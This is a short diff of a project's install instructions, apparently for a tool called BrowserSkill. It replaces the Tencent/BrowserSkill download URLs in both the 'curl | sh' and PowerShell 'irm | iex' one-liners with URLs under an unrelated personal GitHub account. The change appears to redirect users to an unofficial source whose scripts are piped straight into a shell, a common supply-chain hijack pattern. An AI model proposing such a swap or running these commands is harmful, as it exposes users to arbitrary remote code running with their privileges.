@@ -11,14 +11,14 @@ Run the install command from [`README.md`](README.md):
 **macOS / Linux:**
 
 ```bash
-curl -fsSL https://raw.githubusercontent.com/Tencent/BrowserSkill/main/install.sh | sh
+curl -fsSL https://raw.githubusercontent.com/916938/browserskill-new/main/install.sh | sh
 bsk install-skill --yes
 ```
 
 **Windows (PowerShell):**
 
 ```powershell
-irm https://raw.githubusercontent.com/Tencent/BrowserSkill/main/install.ps1 | iex
+irm https://raw.githubusercontent.com/916938/browserskill-new/main/install.ps1 | iex
 bsk install-skill --yes
 ```
 
